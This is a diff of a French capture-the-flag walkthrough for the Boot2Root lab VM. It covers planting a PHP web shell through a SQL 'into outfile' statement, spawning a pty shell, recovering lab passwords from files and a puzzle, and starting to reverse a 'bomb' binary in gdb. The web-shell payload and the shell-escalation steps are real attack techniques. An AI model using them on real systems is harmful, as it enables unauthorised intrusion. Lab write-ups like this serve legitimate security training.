@@ -140,7 +140,7 @@ GENERATED WORDS: 4612
 ```
 On va essayer de placer notre backdoor dans un de ces repertoires : /forum/templates_c apres avoir cree une nouvelle db que jai nommé b2r
 ```
-select "<?php system($_GET['cmd']); ?>" into outfile "https://192.168.1.50/var/www/forum/templates_c/backdoor.php"
+select "<?php system($_GET['cmd']); ?>" into outfile "var/www/forum/templates_c/backdoor.php"
 ```
 
 ![b2r_2](./photos/b2r_2.png)
@@ -178,9 +178,211 @@ $ uname -a
 Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
 ```
 
-### WWWW-DATA
+### WWW-DATA
 
 La premiere idée qui me vient est d'essayer de faire une injection dynamique de librairie des plus classiques comme pour le level13 de snowcrash.
 
 Cependant apres avoir execute l'injection, nous avons bien les droits root mais impossible d'acceder au dossier /root ??
 
+En fouillant un peu plus nous remarquons un dossier LOOKATME dans le /home
+
+```$ cd /home
+$ ls
+LOOKATME
+ft_root
+laurie
+laurie@borntosec.net
+lmezard
+thor
+zaz
+$ cd LOOKATME
+$ ls
+password
+$ cat password
+lmezard:G!@M6f4Eatau{sF"
+$ su lemezard
+su: must be run from a terminal
+```
+
+Afin de pouvoir run su il a fallu faire quelque recherches sur internet et on va utiliser le module python pty :
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@BornToSecHackMe:/home/LOOKATME$ su lmezard
+su lmezard
+Password: G!@M6f4Eatau{sF"
+
+lmezard@BornToSecHackMe:/home/LOOKATME$ ls
+ls
+lmezard@BornToSecHackMe:/home/LOOKATME$ cd /home/lmezard
+lmezard@BornToSecHackMe:~$ ls
+fun  README
+lmezard@BornToSecHackMe:~$ cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
+
+Nous remarquons ici la presence d'un fichier fun. En etudiant le fichier nous voyons que c'est une archive tar.
+Essayons de recuperer le fichier pour l'etudier sur un terminal correct :
+```
+cp fun /var/www/forum/templates_c/fun // sur le terminal boot2root
+tar -xf fun
+cd ft_fun
+```
+
+En regardant un petit peu le fichier cat en lui meme nous voyons assez rapidement la presence de getme avec des index. Il va donc surement falloir les mettre dans l'ordre et ainsi nous aurons le mdp
+
+```
+grep return *
+7DT5Q.pcap:	return 'a';
+APM1E.pcap:	return 'I';
+BJPCP.pcap:	return 'w';
+BJPCP.pcap:	return 'n';
+BJPCP.pcap:	return 'a';
+BJPCP.pcap:	return 'g';
+BJPCP.pcap:	return 'e';
+ECOW1.pcap:	return 'e';
+J5LKW.pcap:	return 't';
+T44J5.pcap:	return 'p';
+T7VV0.pcap:	return 'r';
+ZPY1Q.pcap:	return 'h';
+```
+
+Nous avons les dernieres lettres dans l'ordre en faisant cat BJPCP.pcap | grep return :  wnage. Il nous reste aIetprh
+
+En fait le challenge est tout bete. Chaque fichier correspond a du code et est listé //file[index]. Nous allons donc recuperer tous les index des fichier getme et afficher le file suivant pour avoir le retour, sauf pour ceux que l'on a deja eu. Je montre la marche a suivre pour le premier :
+
+```
+grep getme *
+0T16C.pcap:char getme4() {
+32O0M.pcap:char getme7() {
+331ZU.pcap:char getme1() {
+4KAOH.pcap:char getme5() {
+91CD0.pcap:char getme6() {
+B62N4.pcap:char getme3() {
+BJPCP.pcap:char getme8() {
+BJPCP.pcap:char getme9() {
+BJPCP.pcap:char getme10() {
+BJPCP.pcap:char getme11() {
+BJPCP.pcap:char getme12()
+BJPCP.pcap:	printf("%c",getme1());
+BJPCP.pcap:	printf("%c",getme2());
+BJPCP.pcap:	printf("%c",getme3());
+BJPCP.pcap:	printf("%c",getme4());
+BJPCP.pcap:	printf("%c",getme5());
+BJPCP.pcap:	printf("%c",getme6());
+BJPCP.pcap:	printf("%c",getme7());
+BJPCP.pcap:	printf("%c",getme8());
+BJPCP.pcap:	printf("%c",getme9());
+BJPCP.pcap:	printf("%c",getme10());
+BJPCP.pcap:	printf("%c",getme11());
+BJPCP.pcap:	printf("%c",getme12());
+G7Y8I.pcap:char getme2() {
+cat 331ZU.pcap
+char getme1() {
+
+//file5#
+grep -w file6 *
+cat APM1E.pcap
+	return 'I';
+
+//file6#
+```
+Apres avoir fait ca pour tous les index nous avons le password suivant : Iheartpwnage. Cependant lorsque l'on essaye de se log en ssh le password est le mauvais car il faut un hash
+
+```
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@192.168.1.27's password: Iheartpwnage
+
+Permission denied, please try again.
+laurie@192.168.1.27's password:
+```
+
+```
+echo -n "Iheartpwnage" | shasum -a 256 // -n pour ne pas echo le \n
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+ssh laurie@192.168.1.27 // depuis la VM Kali directement
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@192.168.1.27's password:
+laurie@BornToSecHackMe:~$ ls
+bomb  README
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+### LAURIE
+
+Recuperons le binaire sur notre VM Kali pour pouvoir l'etudier avec gdb-peda, ca sera plus simple
+
+```
+scp laurie@192.168.1.27:/home/laurie/bomb ~/boot2root/
+```
+
+On remarque plusieurs fonctions dans le main interessantes : 
+
+``` 
+0x08048b20  phase_1
+0x08048b48  phase_2
+0x08048b98  phase_3
+0x08048ca0  func4
+0x08048ce0  phase_4
+0x08048d2c  phase_5
+0x08048d98  phase_6
+0x08048e94  fun7
+0x08048ee8  secret_phase
+```
+
+
+```
+gdb-peda$ disas phase_1
+Dump of assembler code for function phase_1:
+   0x08048b20 <+0>:	push   ebp
+   0x08048b21 <+1>:	mov    ebp,esp
+   0x08048b23 <+3>:	sub    esp,0x8
+   0x08048b26 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048b29 <+9>:	add    esp,0xfffffff8
+   0x08048b2c <+12>:	push   0x80497c0
+   0x08048b31 <+17>:	push   eax
+   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
+   0x08048b37 <+23>:	add    esp,0x10
+   0x08048b3a <+26>:	test   eax,eax
+   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
+   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
+   0x08048b43 <+35>:	mov    esp,ebp
+   0x08048b45 <+37>:	pop    ebp
+   0x08048b46 <+38>:	ret
+End of assembler dump.
+
+gdb-peda$ x/s 0x80497c0
+0x80497c0:	"Public speaking is very easy."
+gdb-peda$ r
+Starting program: /root/boot2root/bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+```
